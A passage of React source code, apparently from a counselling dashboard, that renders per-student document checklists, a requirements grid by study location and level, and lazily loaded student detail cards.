  const outerCls = embedded ? "" : "rounded-xl border border-stone-200 bg-white p-5";

  return (
    <div className={outerCls}>
      {/* Card header — hidden when embedded (the dropdown header above
          already shows the name + counsellor). We still need the
          profile picker, so render it standalone. */}
      {embedded ? (
        <div className="mb-4 flex flex-wrap items-center gap-3 border-b border-stone-100 pb-3">
          <ProfileToggle
            value={loc}
            options={LOCATIONS}
            onChange={(v) => onUpdateProfile(student.student_id, v, lvl)}
          />
          <ProfileToggle
            value={lvl}
            options={LEVELS}
            onChange={(v) => onUpdateProfile(student.student_id, loc, v)}
          />
          {!loc || !lvl ? (
            <span className="text-[10px] text-amber-600 font-medium">— set profile to enable per-config visibility</span>
          ) : null}
          {onOpenStudent && (
            <button
              onClick={() => onOpenStudent(student.student_id)}
              className="ml-auto text-xs uppercase tracking-[0.15em] text-[#cc785c] hover:text-[#b86a4f]"
            >
              Open full profile ↗
            </button>
          )}
        </div>
      ) : (
        <div className="mb-4 flex flex-wrap items-center justify-between gap-3 border-b border-stone-100 pb-3">
          <div className="flex items-center gap-3 flex-wrap">
            {onOpenStudent ? (
              <button
                onClick={() => onOpenStudent(student.student_id)}
                className="font-semibold text-black hover:text-[#cc785c] hover:underline"
              >
                {student.display_name || student.username}
              </button>
            ) : (
              <span className="font-semibold text-black">{student.display_name || student.username}</span>
            )}
            {student.display_name && (
              <span className="font-mono text-[10px] text-stone-400">{student.username}</span>
            )}
            <div className="flex items-center gap-1.5">
              <ProfileToggle
                value={loc}
                options={LOCATIONS}
                onChange={(v) => onUpdateProfile(student.student_id, v, lvl)}
              />
              <ProfileToggle
                value={lvl}
                options={LEVELS}
                onChange={(v) => onUpdateProfile(student.student_id, loc, v)}
              />
              {!loc || !lvl ? (
                <span className="text-[10px] text-amber-600 font-medium">— set profile to enable per-config visibility</span>
              ) : null}
            </div>
          </div>
          {role === "admin" && (
            <span className="text-xs text-stone-500">{student.counsellor_name || "Unassigned"}</span>
          )}
        </div>
      )}

      {/* Doc chips */}
      <div className="space-y-3">
        {DOC_GROUPS.map((group) => {
          if (group.dynamic) {
            const visibleKinds = new Set(
              ["lor", "internship", "ngo", "extracurricular", "sop"].filter(k => visibleCols.has(k))
            );
            if (visibleKinds.size === 0) return null;
            return (
              <div key={group.label} className="mt-1 flex items-start gap-4 border-t border-stone-100 pt-3">
                <span className="w-20 shrink-0 pt-1 text-[10px] font-semibold uppercase tracking-[0.15em] text-indigo-500">
                  {group.label}
                </span>
                <ReqDocsGroup
                  reqdocs={student.req_docs}
                  visibleKinds={visibleKinds}
                  studentId={student.student_id}
                  onShowReqDoc={handleShowReqDoc}
                  onAddKind={handleAddReqDoc}
                />
              </div>
            );
          }
          const visibleGroupCols = group.cols.filter(c => visibleCols.has(c.key));
          if (visibleGroupCols.length === 0) return null;
          return (
            <div
              key={group.label}
              className={`flex items-start gap-4${group.special ? " mt-1 border-t border-stone-100 pt-3" : ""}`}
            >
              <span className={`w-20 shrink-0 pt-1 text-[10px] font-semibold uppercase tracking-[0.15em]${group.special ? " text-indigo-500" : " text-stone-400"}`}>
                {group.label}
              </span>
              <div className="flex flex-wrap gap-1.5">
                {visibleGroupCols.map((col) => (
                  <DocChip
                    key={col.key}
                    col={col}
                    docs={student.docs}
                    onShowPopup={handleShowPopup}
                    onRemove={() => handleRemove(col.key)}
                  />
                ))}
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ── Document-config 2×2 grid ─────────────────────────────────────────────────
function DocConfigGrid({ configs, onUpdateConfig }) {
  return (
    <div className="mb-6 rounded-xl border border-stone-200 bg-white p-5">
      <p className="mb-4 text-[10px] font-semibold uppercase tracking-[0.2em] text-stone-400">
        Document requirements by student profile — changes apply to all students in that profile
      </p>
      <div className="grid gap-3" style={{ gridTemplateColumns: "auto 1fr 1fr" }}>
        {/* Column headers */}
        <div />
        <div className="text-center text-[11px] font-bold uppercase tracking-[0.15em] text-stone-600">In India</div>
        <div className="text-center text-[11px] font-bold uppercase tracking-[0.15em] text-stone-600">Outside India</div>
        {/* Undergrad row */}
        <div className="flex items-center text-[11px] font-bold uppercase tracking-[0.15em] text-stone-600 pr-3">Undergrad</div>
        <div className="flex justify-center">
          <DocFilterDropdown
            visible={configs.in_india_undergrad || new Set(ALL_KEYS)}
            onChange={(s) => onUpdateConfig("in_india", "undergrad", s)}
          />
        </div>
        <div className="flex justify-center">
          <DocFilterDropdown
            visible={configs.outside_india_undergrad || new Set(ALL_KEYS)}
            onChange={(s) => onUpdateConfig("outside_india", "undergrad", s)}
          />
        </div>
        {/* Postgrad row */}
        <div className="flex items-center text-[11px] font-bold uppercase tracking-[0.15em] text-stone-600 pr-3">Postgrad</div>
        <div className="flex justify-center">
          <DocFilterDropdown
            visible={configs.in_india_postgrad || new Set(ALL_KEYS)}
            onChange={(s) => onUpdateConfig("in_india", "postgrad", s)}
          />
        </div>
        <div className="flex justify-center">
          <DocFilterDropdown
            visible={configs.outside_india_postgrad || new Set(ALL_KEYS)}
            onChange={(s) => onUpdateConfig("outside_india", "postgrad", s)}
          />
        </div>
      </div>
    </div>
  );
}

function StudentDocumentsChecklist({ role, onOpenStudent }) {
  // Lightweight roster fetch — just student_id, names, counsellor, and
  // doc profile. The expensive per-student chip data (every uploaded
  // file + every required-doc row) is fetched lazily when the user
  // expands a card. Earlier this view fetched the whole grid for every
  // student up front; the new approach keeps the initial paint cheap
  // and only pays for what the staff actually opens.
  const [roster,        setRoster]      = useState(null);  // null = loading
  const [configs,       setConfigs]     = useState({});
  const [error,         setError]       = useState(null);
  const [popup,         setPopup]       = useState(null);
  const [reqDocPopup,   setReqDocPopup] = useState(null);  // { doc, studentId }
  const [expanded,      setExpanded]    = useState(() => new Set());
  // Per-student detail cache: { [studentId]: { state, data, error } }
  //   state: "idle" | "loading" | "loaded" | "error"
  const [detail,        setDetail]      = useState({});

  // Initial fetch — light. The full per-student summary is requested on
  // expand via fetchStudent below.
  useEffect(() => {
    Promise.all([
      api.listStudents(),
      api.getDocConfigs(),
    ]).then(([students, cfgRows]) => {
      // Keep just the fields the row header needs; drop the heavy
      // `data` blob so we don't carry the full intake JSON for every
      // student around in memory.
      const light = (students || []).map((s) => ({
        student_id:      s.student_id,
        username:        s.username,
        display_name:    s.display_name,
        counsellor_name: s.counsellor_name || null,
        intake_complete: !!s.intake_complete,
      }));
      setRoster(light);
      const map = {};
      for (const row of cfgRows) {
        map[configKey(row.location, row.level)] = new Set(row.visible_keys);
      }
      setConfigs(map);
    }).catch((e) => setError(e.message));
  }, []);

  const fetchStudent = useCallback(async (studentId) => {
    setDetail((prev) => ({ ...prev, [studentId]: { state: "loading", data: null, error: null } }));
    try {
      const row = await api.getStudentDocumentsSummary(studentId);
      setDetail((prev) => ({ ...prev, [studentId]: { state: "loaded", data: row, error: null } }));
      // If the popup is open on this student, refresh its row reference too.
      setReqDocPopup((prev) => {
        if (!prev || prev.studentId !== studentId) return prev;
        const fresh = (row?.req_docs || []).find((rd) => String(rd.id) === String(prev.doc.id));
        return fresh ? { doc: fresh, studentId } : prev;
      });
      return row;
    } catch (e) {
      setDetail((prev) => ({ ...prev, [studentId]: { state: "error", data: null, error: e.message || "Couldn't load" } }));
      throw e;
    }
  }, []);

  const toggleExpand = useCallback((studentId) => {
    setExpanded((prev) => {
      const next = new Set(prev);
      if (next.has(studentId)) {
        next.delete(studentId);
        return next;
      }
      next.add(studentId);
      // Fetch on first expand (only if we haven't already loaded it).
      setDetail((cur) => {
        if (!cur[studentId] || cur[studentId].state === "error") {
          // Schedule the fetch async — don't block this state update.
          Promise.resolve().then(() => fetchStudent(studentId).catch(() => {}));
        }
        return cur;
      });
      return next;
    });
  }, [fetchStudent]);

  const handleShowReqDoc = useCallback((doc, studentId) => {
    setReqDocPopup({ doc, studentId });
  }, []);

  const handleAddReqDoc = useCallback(async (kind, studentId) => {
    try {
      await api.createRequiredDocForStudent(studentId, { kind });
      await fetchStudent(studentId);
    } catch (e) {
      // eslint-disable-next-line no-alert
      window.alert(e.message || "Couldn't add row.");
    }
  }, [fetchStudent]);

  const handleUpdateConfig = useCallback(async (location, level, newSet) => {
    const key = configKey(location, level);
    setConfigs(prev => ({ ...prev, [key]: newSet }));
    try {
      await api.updateDocConfig(location, level, Array.from(newSet));
    } catch {
      // Revert is intentionally skipped — stale UI is preferable to thrashing
    }
  }, []);

  const handleRemoveFromConfig = useCallback((location, level, docKey) => {
    const key = configKey(location, level);
    setConfigs(prev => {
      const cur = prev[key] || new Set(ALL_KEYS);
      const next = new Set(cur);
      next.delete(docKey);
      api.updateDocConfig(location, level, Array.from(next)).catch(() => {});
      return { ...prev, [key]: next };
    });
  }, []);

  const handleUpdateProfile = useCallback(async (studentId, location, level) => {
    // Optimistic update on both the lightweight roster row (so the
    // collapsed header reflects it) and the cached detail row.
    setRoster((prev) => (prev || []).map((r) =>
      r.student_id === studentId ? { ...r, doc_location: location || null, doc_level: level || null } : r
    ));
    setDetail((prev) => {
      const cur = prev[studentId];
      if (!cur || !cur.data) return prev;
      return { ...prev, [studentId]: { ...cur, data: { ...cur.data, doc_location: location || null, doc_level: level || null } } };
    });
    try {
      await api.updateStudentDocProfile(studentId, location, level);
    } catch {
      // leave optimistic update in place
    }
  }, []);

  if (roster === null && !error) {
    return (
      <div className="flex items-center gap-2 py-10 text-sm text-stone-600">
        <Loader2 className="h-4 w-4 animate-spin" /> Loading…
      </div>
    );
  }

  if (error) {
    return (
      <p className="inline-flex items-center gap-2 py-8 text-xs text-red-700">
        <AlertCircle className="h-3 w-3" /> {error}
      </p>
    );
  }

  return (
    <div>
      <DocConfigGrid configs={configs} onUpdateConfig={handleUpdateConfig} />
      <p className="mb-4 text-sm text-stone-800">
        Click any student to load their document chip grid. Green chips = uploaded, red chips = missing.
        Use the toggles on each card to assign a profile.
      </p>
      {(roster || []).length === 0 ? (
        <p className="text-sm text-stone-600">No students yet.</p>
      ) : (
        <div className="space-y-2">
          {roster.map((r) => {
            const isOpen = expanded.has(r.student_id);
            const d = detail[r.student_id];
            return (
              <div key={r.student_id} className="rounded-xl border border-stone-200 bg-white">
                {/* Collapsed header — always visible. Click to expand and
                    trigger the lazy per-student fetch. */}
                <button
                  type="button"
                  onClick={() => toggleExpand(r.student_id)}
                  className="flex w-full items-center justify-between gap-3 px-5 py-3 text-left transition hover:bg-stone-50"
                >
                  <span className="flex items-center gap-3">
                    <ChevronRight className={`h-4 w-4 text-stone-500 transition-transform ${isOpen ? "rotate-90" : ""}`} />
                    <span className="font-semibold text-black">{r.display_name || r.username}</span>
                    {r.display_name && (
                      <span className="font-mono text-[10px] text-stone-400">{r.username}</span>
                    )}
                  </span>
                  <span className="flex items-center gap-3 text-xs text-stone-600">
                    {role === "admin" && (
                      <span>{r.counsellor_name || "Unassigned"}</span>
                    )}
                    {d?.state === "loading" && <Loader2 className="h-3.5 w-3.5 animate-spin" />}
                  </span>
                </button>

                {/* Expanded body — chip grid for this one student. */}
                {isOpen && (
                  <div className="border-t border-stone-100 px-5 py-4">
                    {!d || d.state === "loading" ? (
                      <div className="flex items-center gap-2 py-6 text-sm text-stone-600">
                        <Loader2 className="h-4 w-4 animate-spin" /> Loading documents for this student…
                      </div>
                    ) : d.state === "error" ? (
                      <div className="flex items-center justify-between gap-3 text-sm text-red-700">
                        <span className="inline-flex items-center gap-2">
                          <AlertCircle className="h-3.5 w-3.5" /> {d.error}
                        </span>
                        <button
                          type="button"
                          onClick={() => fetchStudent(r.student_id).catch(() => {})}
                          className="border border-stone-300 bg-white px-2 py-0.5 text-xs uppercase tracking-[0.15em] text-black hover:border-stone-700"
                        >
                          Retry
                        </button>
                      </div>
                    ) : d.data ? (
                      <StudentDocCard
                        student={d.data}
                        role={role}
                        configs={configs}
                        onShowPopup={setPopup}
                        onShowReqDoc={handleShowReqDoc}
                        onAddReqDoc={handleAddReqDoc}
                        onRemoveFromConfig={handleRemoveFromConfig}
                        onUpdateProfile={handleUpdateProfile}
                        onOpenStudent={onOpenStudent}
                        embedded
                      />
                    ) : (
                      <p className="text-sm text-stone-600">No data available for this student.</p>
                    )}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      )}
      {popup && (
        <FilePopup
          col={popup.col}
          file={popup.file}
          studentId={popup.studentId}
          onClose={() => setPopup(null)}
          onOpenStudent={onOpenStudent ? () => { setPopup(null); onOpenStudent(popup.studentId); } : null}
        />
      )}
      {reqDocPopup && (
        <RecommendedDocPopup
          doc={reqDocPopup.doc}
          studentId={reqDocPopup.studentId}
          role={role}
          onClose={() => setReqDocPopup(null)}
          onRefresh={() => fetchStudent(reqDocPopup.studentId).catch(() => {})}
        />
      )}
    </div>
  );
}
